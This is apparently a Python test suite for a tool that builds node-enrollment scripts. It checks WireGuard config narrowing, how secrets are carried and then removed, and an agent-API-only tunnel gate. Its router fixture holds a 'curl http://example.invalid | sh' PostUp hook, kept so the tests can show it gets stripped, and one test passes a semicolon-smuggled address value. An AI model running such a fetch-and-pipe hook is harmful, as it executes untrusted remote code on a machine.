"""Enroll node as one script (R161): a router's WireGuard config read,
narrowed to the controller, carried in a script that runs the provisioner;
and the controller answering a tunnel address on the agent's API alone."""
import base64
import os
import re
import shutil
import subprocess
import tempfile
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import enrollscript as es  # noqa: E402
import nodes  # noqa: E402

ROUTER = """[Interface]
PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MDA=
Address = 10.6.0.5/32, fd00::5/128
DNS = 192.168.1.1
PostUp = curl http://example.invalid | sh

[Peer]
PublicKey = cHVibGlja2V5cHVibGlja2V5cHVibGlja2V5cHViMDA=
PresharedKey = cHJlc2hhcmVkcHJlc2hhcmVkcHJlc2hhcmVkcHJlMDA=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = home.example.net:51820
"""


def answers(**kw):
    return {"reach": "wireguard", "controller": "http://192.168.1.16:7680",
            "wg_conf": ROUTER} | kw


def section(script, tag):
    m = re.search(rf"<<'{tag}'\n(.*?)\n{tag}\n", script, re.S)
    return base64.b64decode(m.group(1).replace("\n", "")) if m else None


class WireGuardConfig(unittest.TestCase):
    def test_the_router_config_is_read_for_the_node_address_and_its_peer(self):
        self.assertEqual(es.parse_wg(ROUTER), {"addr": "10.6.0.5", "endpoint": "home.example.net:51820"})

    def test_the_node_copy_routes_the_controller_alone_and_runs_nothing_of_its_own(self):
        out = es.narrow_wg(ROUTER, "192.168.1.16")
        self.assertIn("AllowedIPs = 192.168.1.16/32", out)
        self.assertNotIn("0.0.0.0/0", out)
        self.assertNotRegex(out, r"(?im)^\s*(DNS|PostUp)\s*=")
        self.assertIn("PersistentKeepalive = 25", out)
        self.assertIn("PresharedKey", out)

    def test_a_config_without_allowed_ips_gets_the_controller(self):
        conf = ROUTER.replace("AllowedIPs = 0.0.0.0/0, ::/0\n", "")
        self.assertIn("AllowedIPs = 192.168.1.16/32", es.narrow_wg(conf, "192.168.1.16"))

    def test_what_cannot_be_a_node_config_says_why(self):
        self.assertIn("PrivateKey", es.parse_wg("[Peer]\nPublicKey = x\n")["error"])
        self.assertIn("2 peers", es.parse_wg(ROUTER + "\n[Peer]\nPublicKey = y\nEndpoint = z:1\n")["error"])
        self.assertIn("IPv4", es.parse_wg(ROUTER.replace("10.6.0.5/32, ", ""))["error"])

    def test_through_the_tunnel_the_controller_is_an_address_not_a_name(self):
        self.assertIn("not a name", es.check(answers(controller="http://builderbot.lan:7680"))["error"])
        self.assertIn("URL", es.check(answers(controller="192.168.1.16"))["error"])
        self.assertIn("no such way", es.check(answers(reach="carrier-pigeon"))["error"])


class Script(unittest.TestCase):
    def build(self, **kw):
        ans = es.check(answers(**kw))
        return ans, es.build(ans, name="cloudbox", user="joe", token="bbe_tok'en",
                             expires=1_800_000_000, provisioner=b"#!/usr/bin/env bash\necho provision\n")

    def test_the_system_picked_rides_with_its_family_file(self):
        import systems
        ans = es.check(answers())
        self.assertEqual(ans["system"], "ubuntu", "the default system when the dialog names none")
        self.assertEqual(es.check(answers(system="rocky"))["system"], "rocky")
        self.assertIn("no such system", es.check(answers(system="haiku"))["error"])
        # A system nobody has walked is offered behind Offer dev features alone.
        import forges
        was = forges.unvetted_ok
        try:
            forges.unvetted_ok = lambda: False
            self.assertIn("Offer dev features", es.check(answers(system="arch"))["error"])
            forges.unvetted_ok = lambda: True
            self.assertEqual(es.check(answers(system="arch"))["system"], "arch")
        finally:
            forges.unvetted_ok = was
        self.assertEqual(systems.family_file("rocky").name, "rhel.sh")
        self.assertTrue(systems.family_file("rocky").is_file())
        s = es.build(ans, name="cloudbox", user="joe", token="t", expires=1_800_000_000,
                     provisioner=b"#!/usr/bin/env bash\necho provision\n", family=b"FAMILY_PICKED=deb\n")
        self.assertEqual(section(s, "FAMILY"), b"FAMILY_PICKED=deb\n")
        self.assertIn('base64 -d > "$dir/provision-family.sh"', s)

    def test_the_script_carries_the_provisioner_the_config_and_the_answers(self):
        ans, s = self.build(sessions=False)
        self.assertTrue(s.startswith("#!/usr/bin/env bash\n"))
        self.assertEqual(section(s, "PROVISIONER"), b"#!/usr/bin/env bash\necho provision\n")
        self.assertEqual(section(s, "WGCONF").decode(), ans["wg_conf"])
        run = next(x for x in s.splitlines() if x.startswith('bash "$dir/provision-linux.sh"'))
        self.assertIn("--controller 'http://192.168.1.16:7680'", run)
        self.assertIn("--token 'bbe_tok'\\''en'", run)
        self.assertIn("--user 'joe'", run)
        self.assertIn("--session-user none", run)
        self.assertIn('--wg-conf "$dir/bb.conf"', run)
        self.assertIn("private key", s)

    def test_on_the_lan_there_is_no_tunnel_in_it(self):
        ans = es.check({"reach": "lan", "controller": "http://builderbot.lan:7680"})
        s = es.build(ans, name="lanbox", user="bb", token="bbe_x", expires=0, provisioner=b"x")
        self.assertNotIn("WGCONF", s)
        self.assertNotIn("--user", s)
        self.assertEqual(es.home_rules(ans, 7680), "")

    def test_the_router_is_told_the_one_way_rule(self):
        ans, _ = self.build()
        rules = es.home_rules(ans, 7680)
        self.assertIn("ip saddr 10.6.0.5 ip daddr 192.168.1.16 tcp dport 7680 accept", rules)
        self.assertIn("ip saddr 10.6.0.5 drop", rules)

    def run_it(self, provisioner, *args, keep=None):
        """The script as a person runs it, with the root check left out and
        a stand-in provisioner. (exit code, the file after, what it printed)."""
        ans = es.check(answers())
        s = es.build(ans, name="cloudbox", user="bb", token="bbe_x", expires=0, provisioner=provisioner)
        s = s.replace('[ "$(id -u)" -eq 0 ]', "true")
        d = tempfile.mkdtemp()
        try:
            f = os.path.join(d, "enroll-cloudbox.sh")
            with open(f, "w") as fh:
                fh.write(keep if keep is not None else s)
            p = subprocess.run(["bash", f, *args], capture_output=True, text=True, timeout=30)
            with open(f) as fh:
                return p.returncode, fh.read(), p.stdout + p.stderr
        finally:
            shutil.rmtree(d, ignore_errors=True)

    def test_once_enrolled_the_script_keeps_itself_without_the_vpn_config(self):
        code, after, said = self.run_it(b'echo "provisioned with $*"\n')
        self.assertEqual(code, 0, said)
        self.assertIsNone(section(after, "WGCONF"))
        key = base64.b64encode(es.check(answers())["wg_conf"].encode()).decode()[:60]
        self.assertNotIn(key, after.replace("\n", ""))
        self.assertNotIn("PrivateKey", after)
        self.assertIn("install -m 600 /etc/wireguard/bb.conf", after)
        self.assertIsNotNone(section(after, "PROVISIONER"))
        self.assertIn("--wg-conf", said)
        self.assertIn("out of", said)
        # ...and what is left still runs: without the node's own config it
        # says where one comes from, rather than enrolling with none.
        code2, _, said2 = self.run_it(b"echo again\n", keep=after)
        self.assertEqual(code2, 1, said2)
        self.assertIn("make a new script", said2)

    def test_a_failed_run_keeps_the_config_for_another_try(self):
        code, after, said = self.run_it(b"exit 3\n")
        self.assertEqual(code, 3)
        self.assertIsNotNone(section(after, "WGCONF"), said)

    def test_flags_reach_the_provisioner(self):
        code, _, said = self.run_it(b'echo "provisioned with $*"\n', "--dev")
        self.assertEqual(code, 0, said)
        self.assertIn("--dev", said)

    def test_the_file_is_named_for_the_node(self):
        self.assertEqual(es.filename("cloud box/1"), "enroll-cloud-box-1.sh")
        self.assertEqual(es.filename("vps", "n_12ab"), "enroll-vps-n_12ab.sh")


class PublicHostname(unittest.TestCase):
    """Through a public hostname (R170): a name over https, hosting only
    whatever was ticked, the agent told to verify by CA, and the home end
    told the rule, with cloudflared's config as the example."""
    def test_the_controller_is_an_https_hostname(self):
        self.assertIn("https", es.check({"reach": "public", "controller": "http://bb.example.com"})["error"])
        self.assertIn("not an address", es.check({"reach": "public", "controller": "https://1.2.3.4"})["error"])
        ans = es.check({"reach": "public", "controller": "https://BB.Example.com/", "sessions": True})
        self.assertEqual((ans["sessions"], ans["tunnel_host"], ans["controller"]),
                         (False, "bb.example.com", "https://BB.Example.com"))

    def test_the_script_says_so_and_carries_no_tunnel(self):
        ans = es.check({"reach": "public", "controller": "https://bb.example.com"})
        s = es.build(ans, name="vps", user="bb", token="bbe_x", expires=0, provisioner=b"x")
        run = next(x for x in s.splitlines() if x.startswith('bash "$dir/provision-linux.sh"'))
        self.assertIn("--reach public", run)
        self.assertIn("--session-user none", run)
        self.assertNotIn("WGCONF", s)
        rules = es.home_rules(ans, 7680)
        self.assertIn("hostname: bb.example.com", rules)
        self.assertIn("path: ^/api/v1/agent/", rules)
        self.assertIn("http_status:404", rules)
        self.assertIn(":7680", rules)


class Door(unittest.TestCase):
    """A door in for SSH (R174): the recipe's answers checked, the secret in
    the script until it has run and out of it after, the flags to the
    provisioner."""
    def test_the_answers_are_checked(self):
        base = {"reach": "lan", "controller": "http://192.168.1.16:7680"}
        self.assertIn("no such door", es.check(base | {"door": "pigeon"})["error"])
        self.assertIn("hostname of its own", es.check(base | {"door": "cloudflared", "door_secret": "tok"})["error"])
        self.assertIn("one line", es.check(base | {"door": "tailscale", "door_secret": "two\nlines"})["error"])
        ans = es.check(base | {"door": "cloudflared", "door_host": "SSH-vps.Example.com", "door_secret": "eyJ.tok", "door_close22": True})
        self.assertEqual((ans["door"], ans["door_host"], ans["door_secret"], ans["door_close22"]),
                         ("cloudflared", "ssh-vps.example.com", "eyJ.tok", True))
        ts = es.check(base | {"door": "tailscale", "door_host": "ignored.example.com", "door_secret": "tskey-auth-x"})
        self.assertEqual((ts["door"], ts["door_host"], ts["door_close22"]), ("tailscale", "", False))

    def test_the_script_carries_the_secret_until_it_has_run(self):
        ans = es.check({"reach": "lan", "controller": "http://192.168.1.16:7680", "door": "cloudflared",
                        "door_host": "ssh-vps.example.com", "door_secret": "eyJ.tok", "door_close22": True})
        s = es.build(ans, name="vps", user="bb", token="bbe_x", expires=0, provisioner=b'echo "provisioned with $*"\n')
        self.assertEqual(section(s, "DOORSECRET"), b"eyJ.tok")
        run = next(x for x in s.splitlines() if x.startswith('bash "$dir/provision-linux.sh"'))
        self.assertIn("--door 'cloudflared' --door-host 'ssh-vps.example.com' --door-close22", run)
        self.assertIn('--door-secret "$dir/door-secret"', run)
        s = s.replace('[ "$(id -u)" -eq 0 ]', "true")
        d = tempfile.mkdtemp()
        try:
            f = os.path.join(d, "enroll-vps.sh")
            with open(f, "w") as fh:
                fh.write(s)
            p = subprocess.run(["bash", f], capture_output=True, text=True, timeout=30)
            with open(f) as fh:
                after = fh.read()
            # Run again, the repair: the secret is out of it, and the script
            # still runs rather than dying on a chmod of a file it no longer
            # writes (the operator, 11 Oct).
            p2 = subprocess.run(["bash", f], capture_output=True, text=True, timeout=30)
        finally:
            shutil.rmtree(d, ignore_errors=True)
        self.assertEqual(p.returncode, 0, p.stdout + p.stderr)
        self.assertIn("--door-secret", p.stdout)
        self.assertIsNone(section(after, "DOORSECRET"))
        self.assertNotIn("eyJ.tok", after)
        self.assertNotIn(base64.b64encode(b"eyJ.tok").decode(), after)
        self.assertIn("the node keeps it", after)
        self.assertIn("out of", p.stdout)
        self.assertEqual(p2.returncode, 0, p2.stdout + p2.stderr)
        self.assertNotIn("cannot access", p2.stderr)


class Again(unittest.TestCase):
    """A node enrolling again (R177): the script bound to its machine, with
    no secret in it, the node's own WireGuard config and door left as they
    are."""
    def test_the_script_is_bound_and_carries_no_secret(self):
        ans = es.check({"reach": "wireguard", "controller": "http://192.168.1.16:7680", "tunnel_addr": "10.6.0.5",
                        "door": "cloudflared", "door_host": "door.example.com"}, again=True)
        self.assertNotIn("error", ans)
        self.assertEqual((ans["wg_conf"], ans["tunnel_addr"], ans["door_secret"]), ("", "10.6.0.5", ""))
        s = es.build(ans, name="vps", user="bb", token="bbe_x", expires=0, provisioner=b"x", again=True, machine="ab" * 16)
        run = next(x for x in s.splitlines() if x.startswith('bash "$dir/provision-linux.sh"'))
        self.assertIn("--machine 'abababababababababababababababab'", run)
        self.assertIn('--wg-conf "$dir/bb.conf"', run)
        self.assertIn("--door 'cloudflared' --door-host 'door.example.com'", run)
        self.assertNotIn("--door-secret", run)
        self.assertIsNone(section(s, "WGCONF"))
        self.assertIsNone(section(s, "DOORSECRET"))
        self.assertIn("install -m 600 /etc/wireguard/bb.conf", s)
        self.assertIn("the node keeps it", s)
        self.assertIn("enroll vps again", s)
        # Without `again`, the same answers are refused for what they lack.
        self.assertIn("PrivateKey", es.check({"reach": "wireguard", "controller": "http://192.168.1.16:7680"})["error"])


class TunnelGate(unittest.TestCase):
    def setUp(self):
        self.was = nodes.tunnel_addrs, nodes.tunnel_hosts
        nodes.tunnel_addrs = lambda: frozenset({"10.6.0.5"})
        nodes.tunnel_hosts = lambda: frozenset({"bb.example.com"})

    def tearDown(self):
        nodes.tunnel_addrs, nodes.tunnel_hosts = self.was

    def test_a_tunnel_hostname_reaches_the_agent_api_and_nothing_else(self):
        self.assertEqual(nodes.tunnel_refuses("172.16.0.9", "/api/v1/agent/work", host="bb.example.com"), "")
        self.assertIn("hostname", nodes.tunnel_refuses("172.16.0.9", "/api/status", host="BB.example.com:443"))
        self.assertIn("hostname", nodes.tunnel_refuses("172.16.0.9", "/", edge=True), "an edge's own headers mark it too")
        self.assertEqual(nodes.tunnel_refuses("172.16.0.9", "/api/status", host="builderbot.lan"), "")

    def test_a_tunnel_address_reaches_the_agent_api_and_nothing_else(self):
        self.assertEqual(nodes.tunnel_refuses("10.6.0.5", "/api/v1/agent/work"), "")
        for path in ("/", "/login", "/api/status", "/api/v1/nodes", "/term/ws"):
            self.assertIn("agent's API", nodes.tunnel_refuses("10.6.0.5", path), path)

    def test_any_other_address_is_not_this_gate_s(self):
        self.assertEqual(nodes.tunnel_refuses("192.168.1.20", "/api/status"), "")

    def test_the_address_comes_from_the_script_never_the_report(self):
        self.assertEqual(nodes.tunnel_addr({"config": {"tunnel": {"addr": "10.6.0.5"}}}), "10.6.0.5")
        self.assertEqual(nodes.tunnel_addr({"reported": {"tunnel": {"addr": "127.0.0.1"}},
                                            "config": {"tunnel": {"addr": "10.6.0.5"}}}), "10.6.0.5")
        self.assertEqual(nodes.tunnel_addr({"reported": {"tunnel": {"addr": "127.0.0.1"}}}), "", "R92")
        self.assertEqual(nodes.tunnel_addr({"config": {"tunnel": {"addr": "not; an address"}}}), "")


if __name__ == "__main__":
    unittest.main()

